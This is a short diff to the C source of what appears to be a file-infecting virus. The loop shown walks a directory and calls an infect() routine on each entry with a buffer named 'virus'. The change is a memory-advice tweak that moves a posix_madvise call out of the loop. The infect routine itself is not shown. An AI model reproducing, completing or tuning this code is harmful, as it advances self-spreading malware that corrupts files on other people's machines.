@@ -388,12 +388,12 @@ int main(int argc, char *const argv[], char *const envp[]) {
         if (dir) {
             struct dirent entry;
             struct dirent *result;
+            posix_madvise(virus, info.size, POSIX_MADV_WILLNEED);
             while (true) {
                 int error = readdir_r(dir, &entry, &result); 
                 assert(!error);
                 if (!result) break;
 
-                posix_madvise(virus, info.size, POSIX_MADV_SEQUENTIAL);
                 error = infect(virus, &info, entry.d_name);
                 if (error) {
                     fprintf(stderr, "cannot infect %s: %s\n", entry.d_name, strerror(error));
